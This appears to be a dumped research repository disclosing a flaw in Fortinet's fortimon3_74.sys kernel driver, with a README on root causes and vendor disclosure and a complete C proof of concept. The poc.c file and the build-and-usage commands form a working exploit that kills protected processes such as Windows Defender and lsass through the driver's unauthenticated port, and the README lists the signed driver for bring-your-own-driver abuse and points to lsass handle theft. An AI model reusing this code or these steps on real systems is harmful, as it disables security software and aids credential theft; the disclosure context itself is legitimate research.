@@ -1,0 +1,164 @@
+Project Path: arc_mein-0_forti-research_5orlqzxl
+
+Source Tree:
+
+```txt
+arc_mein-0_forti-research_5orlqzxl
+├── README.md
+├── fortimon3_74.sys
+└── poc.c
+
+```
+
+`README.md`:
+
+```md
+# Fortinet fortimon3_74.sys - PPL Bypass via Unauthenticated Kill Command
+
+## Overview
+
+A vulnerability in Fortinet's `fortimon3_74.sys` kernel driver (FortiClient's "anti-exploit" minifilter) allows any local administrator to terminate **any** process - including PPL (Protected Process Light) protected processes like **Windows Defender (MsMpEng.exe)** and **lsass.exe** - by sending an 8-byte message to an unauthenticated communication port.
+
+No buffer overflow. No heap spray. No ROP chain. Just 8 bytes.
+
+## Vulnerability Details
+
+| Field | Value |
+|-------|-------|
+| **Driver** | `fortimon3_74.sys` (FortiClient Anti-Exploit Minifilter) |
+| **Port** | `\Fortimon3FilterAntiExploitPort` |
+| **Impact** | PPL bypass, arbitrary process termination |
+| **Access** | Local administrator |
+| **Authentication** | None |
+| **BYOVD Risk** | High - driver is signed by Fortinet |
+
+The driver exposes a minifilter communication port with no caller authentication. It accepts a simple 8-byte message:
+
+```c
+struct {
+    DWORD magic;  // 0x6C6C696B ("kill" in little-endian ASCII)
+    DWORD pid;    // Target process ID
+};
+```
+
+Upon receiving this message, the driver calls `ZwOpenProcess` with `PROCESS_ALL_ACCESS` from kernel mode (bypassing PPL checks), then `ZwTerminateProcess`. No validation is performed on the caller or target.
+
+### Additional Issue: Handle Leak
+
+The `ZwOpenProcess` handle is created in the **caller's handle table** (missing `OBJ_KERNEL_HANDLE` flag), creating a brief window where a usermode attacker could duplicate a `PROCESS_ALL_ACCESS` handle to a PPL-protected process like `lsass.exe` - enabling credential theft without killing the process.
+
+## Root Causes
+
+1. **No caller authentication** - any admin process can connect to the port
+2. **No target validation** - any PID is accepted, including system-critical processes
+3. **Excessive privilege** - `PROCESS_ALL_ACCESS` used instead of `PROCESS_TERMINATE`
+4. **Handle table misuse** - missing `OBJ_KERNEL_HANDLE` flag exposes kernel handle to usermode
+
+## Demo
+
+### lsass.exe Kill (PPL-protected)
+
+![LSASS Kill - System forced restart](poc.jpg)
+
+### Video Demo
+
+[Watch the full demo](forti.mp4) - demonstrates PPL bypass against protected processes.
+
+## Files
+
+| File | Description |
+|------|-------------|
+| `poc.c` | Proof of Concept - terminates any process by name via the vulnerable driver |
+| `fortimon3_74.sys` | Vulnerable driver binary (Fortinet-signed) |
+| `poc.jpg` | Screenshot - lsass.exe terminated, system restart triggered |
+| `forti.mp4` | Video demo of the exploit |
+
+## Build & Usage
+
+```bash
+cl.exe poc.c /Fe:poc_kill.exe
+poc_kill.exe MsMpEng.exe
+```
+
+Requires: local administrator privileges, `fortimon3_74.sys` loaded.
+
+## Disclosure
+
+- Reported to Fortinet PSIRT with full technical details, PoC, and video demo
+- Status: **Duplicate** (another researcher reported the same issue)
+
+
+
+*me1n*
+
+```
+
+`poc.c`:
+
+```c
+#include <windows.h>
+#include <fltuser.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+
+#pragma comment(lib, "fltlib.lib")
+#pragma comment(lib, "advapi32.lib")
+
+typedef struct { DWORD magic; DWORD pid; } KILL_MSG;
+
+DWORD FindPid(const char *name) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return 0;
+    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
+    if (Process32First(snap, &pe)) {
+        do {
+            if (_stricmp(pe.szExeFile, name) == 0) {
+                CloseHandle(snap);
+                return pe.th32ProcessID;
+            }
+        } while (Process32Next(snap, &pe));
+    }
+    CloseHandle(snap);
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        printf("poc_kill.exe proses name\n");
+        return 1;
+    }
+
+    DWORD pid = FindPid(argv[1]);
+    if (!pid) {
+        printf("%s not found\n", argv[1]);
+        return 1;
+    }
+    printf("%s pid: %u\n", argv[1], pid);
+
+    HANDLE hTest = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+    if (hTest) {
+        printf("OpenProcess succeeded, amma not ppl-protected\n");
+        CloseHandle(hTest);
+    } else {
+        printf("ppl-protected (error %u)\n", GetLastError());
+    }
+
+    HANDLE port;
+    HRESULT hr = FilterConnectCommunicationPort(
+        L"\\Fortimon3FilterAntiExploitPort", 0, NULL, 0, NULL, &port);
+    if (FAILED(hr)) {
+        printf("connect failed 0x%08X\n", hr);
+        return 1;
+    }
+
+    KILL_MSG msg = { 0x6C6C696B, pid };
+    DWORD br = 0;
+    printf("killing %s (pid %u)...\n", argv[1], pid);
+    FilterSendMessage(port, &msg, sizeof(msg), NULL, 0, &br);
+    printf("meow\n");
+
+    CloseHandle(port);
+    return 0;
+}
+
+```
